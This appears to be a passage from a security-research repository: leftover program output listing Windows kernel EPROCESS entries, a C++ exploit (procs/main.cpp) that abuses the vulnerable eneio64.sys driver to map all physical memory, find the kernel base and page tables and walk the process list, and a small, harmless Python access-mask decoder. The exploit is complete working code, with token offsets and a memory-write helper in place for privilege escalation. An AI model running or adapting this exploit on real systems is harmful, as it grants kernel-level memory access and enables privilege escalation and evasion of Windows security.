[#13] EPROCESS: 0xffffa60f493de0c0 | PID: 1440 | Name: fontdrvhost.ex
[#14] EPROCESS: 0xffffa60f48304080 | PID: 1512 | Name: svchost.exe
[#15] EPROCESS: 0xffffa60f4985b080 | PID: 1580 | Name: svchost.exe
[#16] EPROCESS: 0xffffa60f49d08140 | PID: 1668 | Name: LogonUI.exe
[#17] EPROCESS: 0xffffa60f49d0b0c0 | PID: 1676 | Name: dwm.exe
[#18] EPROCESS: 0xffffa60f49d42080 | PID: 1740 | Name: svchost.exe
[#19] EPROCESS: 0xffffa60f49d06080 | PID: 1756 | Name: svchost.exe
[#20] EPROCESS: 0xffffa60f49643080 | PID: 1764 | Name: svchost.exe
[#21] EPROCESS: 0xffffa60f49d97080 | PID: 1836 | Name: svchost.exe
[#22] EPROCESS: 0xffffa60f49de5080 | PID: 1908 | Name: svchost.exe
[#23] EPROCESS: 0xffffa60f49dea080 | PID: 1916 | Name: svchost.exe
[#24] EPROCESS: 0xffffa60f49b54080 | PID: 976 | Name: svchost.exe
[#25] EPROCESS: 0xffffa60f49a19080 | PID: 796 | Name: svchost.exe
[#26] EPROCESS: 0xffffa60f49b72080 | PID: 808 | Name: svchost.exe
[#27] EPROCESS: 0xffffa60f49b71080 | PID: 1536 | Name: svchost.exe

[...]

[*] Found self (leak_proc_addr.exe) at EPROCESS: 0xffffa60f4de55080
[#203] EPROCESS: 0xffffa60f4de55080 | PID: 2900 | Name: leak_proc_addr
[#204] EPROCESS: 0xffffa60f4abf8080 | PID: 13260 | Name: cmd.exe

[...]

[*] Physical memory section unmapped successfully

```

```

`procs/main.cpp`:

```cpp
//       
//                     This exploit targets eneio64.sys PM R/W 
//      (https://www.loldrivers.io/drivers/90ecbbf7-b02f-424d-8b7d-56cc9e3b5873/)
//

#include <Windows.h>
#include <iostream>
#include <psapi.h>
#include <tchar.h>
#include <ntstatus.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")

#define DEVICE_NAME "\\\\.\\GLCKIo"
#define IOCTL_WINIO_MAPPHYSTOLIN 0x80102040
#define IOCTL_WINIO_UNMAPPHYSADDR 0x80102044

// Win11 24H2 offsets - Taken from https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_EPROCESS
#define ACTIVE_PROCESS_LINKS_OFFSET 0x1d8
#define IMAGE_FILE_NAME_OFFSET 0x338
#define UNIQUE_PROCESS_ID_OFFSET 0x1d0
#define TOKEN_OFFSET 0x248

typedef struct _INPUTBUF
{
    ULONG64 Size;
    ULONG64 val2;
    ULONG64 val3;
    ULONG64 MappingAddress;
    ULONG64 val5;
} INPUTBUF;

UINT64 ReadMemoryU64(const UINT8* memory_data, UINT64 physical_address) {
    UINT64 value = 0;
    for (size_t i = 0; i < sizeof(UINT64); ++i) {
        value |= (UINT64)(memory_data[physical_address + i]) << (i * 8);
    }
    return value;
}

void WriteMemoryU64(UINT8* memory_data, UINT64 physical_address, UINT64 value) {
    for (size_t i = 0; i < sizeof(UINT64); ++i) {
        memory_data[physical_address + i] = (UINT8)(value >> (i * 8));
    }
}

void PrintErrorMessage(DWORD errorCode) {
    LPWSTR errorMessage = NULL;
    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        errorCode,
        0,
        (LPWSTR)&errorMessage,
        0,
        NULL);
    std::wcerr << L"Error: " << errorMessage << std::endl;
    LocalFree(errorMessage);
}

UINT64 UnMapViewOfSection(HANDLE drv, INPUTBUF* map) {
    DWORD bytes_returned;
    BOOL success = DeviceIoControl(
        drv,
        IOCTL_WINIO_UNMAPPHYSADDR,
        map,
        sizeof(INPUTBUF),
        map,
        sizeof(INPUTBUF),
        &bytes_returned,
        (LPOVERLAPPED)NULL
    );
    if (success) {
        std::cout << "[*] Physical memory section unmapped successfully" << std::endl;
        return TRUE;
    }
    std::cout << "[X] Failed to unmap physical memory section" << std::endl;
    return FALSE;
}

UINT64 VirtualToPhysical(UINT64 cr3, UINT64 virtualAddr, BYTE* map) {
    UINT64 physicalAddr = 0;
    uint16_t PML4 = (uint16_t)((virtualAddr >> 39) & 0x1FF);
    uint16_t DirectoryPtr = (uint16_t)((virtualAddr >> 30) & 0x1FF);
    uint16_t Directory = (uint16_t)((virtualAddr >> 21) & 0x1FF);
    uint16_t Table = (uint16_t)((virtualAddr >> 12) & 0x1FF);

    uint64_t PML4E = ReadMemoryU64(map, cr3 + PML4 * sizeof(uint64_t));
    if (!(PML4E & 0x1)) {
        printf("[!] PML4E not present for VA 0x%llx\n", virtualAddr);
        return 0;
    }

    uint64_t PDPTE = ReadMemoryU64(map, (PML4E & 0xFFFFFFFFFF000) + DirectoryPtr * sizeof(uint64_t));
    if (!(PDPTE & 0x1)) {
        printf("[!] PDPTE not present for VA 0x%llx\n", virtualAddr);
        return 0;
    }

    if (PDPTE & (1 << 7)) {
        physicalAddr = (PDPTE & 0xFFFFFC0000000) + (virtualAddr & 0x3FFFFFFF);
        return physicalAddr;
    }

    uint64_t PDE = ReadMemoryU64(map, (PDPTE & 0xFFFFFFFFFF000) + Directory * sizeof(uint64_t));
    if (!(PDE & 0x1)) {
        printf("[!] PDE not present for VA 0x%llx\n", virtualAddr);
        return 0;
    }

    if (PDE & (1 << 7)) {
        physicalAddr = (PDE & 0xFFFFFFFE00000) + (virtualAddr & 0x1FFFFF);
        return physicalAddr;
    }

    uint64_t PTE = ReadMemoryU64(map, (PDE & 0xFFFFFFFFFF000) + Table * sizeof(uint64_t));
    if (!(PTE & 0x1)) {
        printf("[!] PTE not present for VA 0x%llx\n", virtualAddr);
        return 0;
    }

    physicalAddr = (PTE & 0xFFFFFFFFFF000) + (virtualAddr & 0xFFF);
    return physicalAddr;
}

DWORD_PTR GetModuleEntryPoint(HMODULE hModule) {
    if (!hModule) {
        printf("Erreur : Module non chargé.\n");
        return 0;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Erreur : Signature DOS invalide.\n");
        return 0;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("Erreur : Signature PE invalide.\n");
        return 0;
    }

    return pNtHeaders->OptionalHeader.AddressOfEntryPoint;
}

UINT64 Exploit(HANDLE drv) {

    DWORD self_pid = GetCurrentProcessId();
    printf("[*] Current process (exploit.exe) PID: %lu\n", self_pid);

    HMODULE hModule = LoadLibrary(L"ntoskrnl.exe");
    printf("[*] ntoskrnl.exe loaded at %p\n", hModule);

    UINT64 kiSystemStartupOffset = ((UINT64)GetProcAddress(hModule, "KiSystemStartup") - (UINT64)hModule);

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        printf("[*] Total physical memory: ~0x%llx bytes\n", memoryStatus.ullTotalPhys);
        printf("[*] Highest available physical memory address: ~0x%llx\n", memoryStatus.ullTotalPhys - 1);
    }
    else {
        printf("[X] Failed to retrieve memory information. Error: %lu\n", GetLastError());
    }

    INPUTBUF* inbuf = (INPUTBUF*)malloc(sizeof(INPUTBUF));
    inbuf->Size = memoryStatus.ullTotalPhys - 1;
    inbuf->val2 = 0;
    inbuf->val3 = 0;
    inbuf->MappingAddress = 0;
    inbuf->val5 = 0;

    DWORD bytes_returned;
    BOOL success = DeviceIoControl(
        drv,
        IOCTL_WINIO_MAPPHYSTOLIN,
        inbuf,
        sizeof(INPUTBUF),
        inbuf,
        sizeof(INPUTBUF),
        &bytes_returned,
        (LPOVERLAPPED)NULL
    );

    if (success) {
        wprintf(L"[*] Mapped %llx bytes at %p\n", inbuf->Size, inbuf->MappingAddress);
        BYTE* memory_data = (BYTE*)inbuf->MappingAddress;

        DWORD_PTR ntosEntryPoint = GetModuleEntryPoint(hModule);
        printf("[*] NTOSKRNL.exe entry point at 0x%llx\n", ntosEntryPoint);

        UINT64 KeCapPersThOffset = ((UINT64)GetProcAddress(hModule, "KeCapturePersistentThreadState") - (UINT64)hModule);
        printf("[*] KeCapturePersistentThreadState offset is 0x%llx\n", KeCapPersThOffset);

        UINT64 supposedNtosBase = 0;
        ULONG32 cr3 = 0;

        for (DWORD_PTR physical_offset = 0; physical_offset < 0x100000; physical_offset += sizeof(UINT64)) {
            UINT64 qword_value = ReadMemoryU64(memory_data, physical_offset);
            if ((qword_value & 0xFFFFF) == (ntosEntryPoint & 0xFFFFF)) {
                printf("[*] Found KiSystemStartup -> %p\n", (void*)qword_value);
                supposedNtosBase = (qword_value - ntosEntryPoint);
                printf("[*] In a silly way, we can assume NTOS base address is %p\n", (void*)supposedNtosBase);

                ULONG32 cr3_physical = physical_offset - 0xf8 - 0xf0 + 0x010;
                cr3 = ReadMemoryU64(memory_data, cr3_physical);
                printf("[*] CR3 (PML4) = %llx\n", cr3);
                break;
            }
        }


        ULONG64 KeCapPersThAddr = KeCapPersThOffset + supposedNtosBase;
        printf("[*] nt!KeCapturePersistentThreadState is at %p\n", (void*)KeCapPersThAddr);

        ULONG64 KeCapPersThAddrPhysical = VirtualToPhysical(cr3, KeCapPersThAddr, memory_data);
        printf("[*] nt!KeCapturePersistentThreadState physical address at %p\n", (void*)KeCapPersThAddrPhysical);

        ULONG64 PsActiveProcessHead = 0;
        int occ = 0;

        for (int i = 0; i < 1000; i++) {

            if (i >= 2 &&
                memory_data[KeCapPersThAddrPhysical + i - 2] == 0x48 &&
                memory_data[KeCapPersThAddrPhysical + i - 1] == 0x8D &&
                memory_data[KeCapPersThAddrPhysical + i] == 0x05) {
                occ++;
                int seq_offset = i - 2;

                //printf("\n\n[*] Found sequence 48 8D 05 (occurrence #%d) at offset 0x%x from function start\n", occ, seq_offset);
                if (occ == 2) {
                    INT32 rip_offset = *(INT32*)&memory_data[KeCapPersThAddrPhysical + seq_offset + 3];
                    UINT64 instruction_addr = KeCapPersThAddr + seq_offset;
                    UINT64 rip_next = instruction_addr + 7;
                    UINT64 target_addr = rip_next + rip_offset;
                    PsActiveProcessHead = target_addr;
                    break;
                }
            }

        }

        if (PsActiveProcessHead != 0) {
            UINT64 list_head_phys = VirtualToPhysical(cr3, PsActiveProcessHead, memory_data);
            if (list_head_phys == 0) {

                //printf("[!] Failed to translate PsActiveProcessHead VA 0x%llx, stopping.\n", PsActiveProcessHead);
                free(inbuf);
                FreeLibrary(hModule);
                return 0;
            }
            UINT64 current_list_entry_va = ReadMemoryU64(memory_data, list_head_phys);
            int count = 0;
            int max_processes = 300; // Can be increased
            bool found_self = false;

            printf("\n[*] Walking PsActiveProcessHead:\n");

            while (current_list_entry_va != PsActiveProcessHead && count < max_processes) {
                UINT64 eprocess_va = current_list_entry_va - ACTIVE_PROCESS_LINKS_OFFSET;

                // Read PID with retry mechanism
                UINT64 pid_va = eprocess_va + UNIQUE_PROCESS_ID_OFFSET;
                UINT64 pid_phys = 0;
                int retry_count = 0;
                const int max_retries = 3;
                for (retry_count = 0; retry_count < max_retries; retry_count++) {
                    pid_phys = VirtualToPhysical(cr3, pid_va, memory_data);
                    if (pid_phys != 0) break;
                    printf("[!] Retry %d: Failed to translate PID VA 0x%llx\n", retry_count + 1, pid_va);
                    Sleep(10); // Short delay to handle potential race conditions
                }
                if (pid_phys == 0) {
                    printf("[!] Failed to translate PID VA 0x%llx after %d retries, skipping.\n", pid_va, max_retries);
                    // Skip to next entry
                    UINT64 next_flink_phys = VirtualToPhysical(cr3, current_list_entry_va, memory_data);
                    if (next_flink_phys == 0) {
                        printf("[!] Failed to translate FLINK VA 0x%llx, stopping.\n", current_list_entry_va);
                        break;
                    }
                    UINT64 next_flink_va = ReadMemoryU64(memory_data, next_flink_phys);
                    if (next_flink_va == 0 || next_flink_va == current_list_entry_va) {
                        printf("[!] Invalid FLINK 0x%llx at VA 0x%llx, stopping.\n", next_flink_va, current_list_entry_va);
                        break;
                    }
                    current_list_entry_va = next_flink_va;
                    continue;
                }
                UINT64 pid = ReadMemoryU64(memory_data, pid_phys);

                // Read process name with retry mechanism

                UINT64 image_name_va = eprocess_va + IMAGE_FILE_NAME_OFFSET;
                UINT64 image_name_phys = 0;

                for (retry_count = 0; retry_count < max_retries; retry_count++) {
                    image_name_phys = VirtualToPhysical(cr3, image_name_va, memory_data);
                    if (image_name_phys != 0) break;
                    printf("[!] Retry %d: Failed to translate ImageFileName VA 0x%llx\n", retry_count + 1, image_name_va);
                    Sleep(10);
                }
                if (image_name_phys == 0) {
                    printf("[!] Failed to translate ImageFileName VA 0x%llx after %d retries, skipping.\n", image_name_va, max_retries);
                    // Skip to next entry
                    UINT64 next_flink_phys = VirtualToPhysical(cr3, current_list_entry_va, memory_data);
                    if (next_flink_phys == 0) {
                        printf("[!] Failed to translate FLINK VA 0x%llx, stopping.\n", current_list_entry_va);
                        break;
                    }
                    UINT64 next_flink_va = ReadMemoryU64(memory_data, next_flink_phys);
                    if (next_flink_va == 0 || next_flink_va == current_list_entry_va) {
                        printf("[!] Invalid FLINK 0x%llx at VA 0x%llx, stopping.\n", next_flink_va, current_list_entry_va);
                        break;
                    }
                    current_list_entry_va = next_flink_va;
                    continue;
                }
                char name[16] = { 0 };
                for (int j = 0; j < 15; j++) {
                    name[j] = memory_data[image_name_phys + j];
                }

                // Check if it is exploit.exe
                if (pid == self_pid) {

                    found_self = true;

                    printf("[*] Found self (exploit.exe) at EPROCESS: 0x%llx\n", eprocess_va);

                    system("pause");

                }

                printf("[#%02d] EPROCESS: 0x%llx | PID: %llu | Name: %s\n", count++, eprocess_va, pid, name);

                // Read the next FLINK with retry mechanism
                UINT64 next_flink_phys = 0;
                for (retry_count = 0; retry_count < max_retries; retry_count++) {
                    next_flink_phys = VirtualToPhysical(cr3, current_list_entry_va, memory_data);
                    if (next_flink_phys != 0) break;
                    printf("[!] Retry %d: Failed to translate FLINK VA 0x%llx\n", retry_count + 1, current_list_entry_va);
                    Sleep(10);
                }
                if (next_flink_phys == 0) {
                    printf("[!] Failed to translate FLINK VA 0x%llx after %d retries, stopping.\n", current_list_entry_va, max_retries);
                    break;
                }
                UINT64 next_flink_va = ReadMemoryU64(memory_data, next_flink_phys);
                if (next_flink_va == 0 || next_flink_va == current_list_entry_va) {
                    printf("[!] Invalid FLINK 0x%llx at VA 0x%llx, stopping.\n", next_flink_va, current_list_entry_va);
                    break;
                }
                current_list_entry_va = next_flink_va;
            }

            printf("[*] Finished walking EPROCESS list. Total processes: %d\n", count);
            if (!found_self) {
                printf("[!] WARNING: Did not find exploit.exe (PID %lu) in the process list!\n", self_pid);
            }
        }

        Sleep(1000);
        UnMapViewOfSection(drv, inbuf);
    }
    else {
        std::cout << "[X] DeviceIoControl failed" << std::endl;
    }

    free(inbuf);
    FreeLibrary(hModule);
    return 0;
}


int main() {

    Sleep(3000); // Short delay to avoid any race condition

    HANDLE drvHandle = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );


    if (drvHandle == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        PrintErrorMessage(error);
        return 1;
    }
    else {
        std::cout << "[*] Successfully opened the device handle" << std::endl;
    }

    Exploit(drvHandle);
    CloseHandle(drvHandle);

    return 0;
}

```

`sd.py`:

```py
def decode_access_mask(mask):
    access_rights = {
        0x00010000: "DELETE",
        0x00020000: "READ_CONTROL",
        0x00040000: "WRITE_DAC",
        0x00080000: "WRITE_OWNER",
        0x00100000: "SYNCHRONIZE",
        0x00000001: "FILE_READ_DATA",
        0x00000002: "FILE_WRITE_DATA",
        0x00000004: "FILE_APPEND_DATA",
        0x00000008: "FILE_READ_EA",
        0x00000010: "FILE_WRITE_EA",
        0x00000020: "FILE_EXECUTE",
        0x00000040: "FILE_DELETE_CHILD",
        0x00000080: "FILE_READ_ATTRIBUTES",
        0x00000100: "FILE_WRITE_ATTRIBUTES",
        0x00020000: "STANDARD_RIGHTS_READ",
        0x00020000: "STANDARD_RIGHTS_WRITE",
        0x00020000: "STANDARD_RIGHTS_EXECUTE",
        0x001f0000: "STANDARD_RIGHTS_ALL",
        0x10000000: "GENERIC_ALL",
        0x20000000: "GENERIC_EXECUTE",
        0x40000000: "GENERIC_WRITE",
        0x80000000: "GENERIC_READ",
    }

    if isinstance(mask, str):
        mask = int(mask, 16)

    associated_rights = []
    for value, name in access_rights.items():
        if mask & value:
            associated_rights.append(name)

    return associated_rights

mask = input("Access Mask: ")
rights = decode_access_mask(mask)

print("Rights associated with the mask:")
for right in rights:
    print(f"- {right}")
```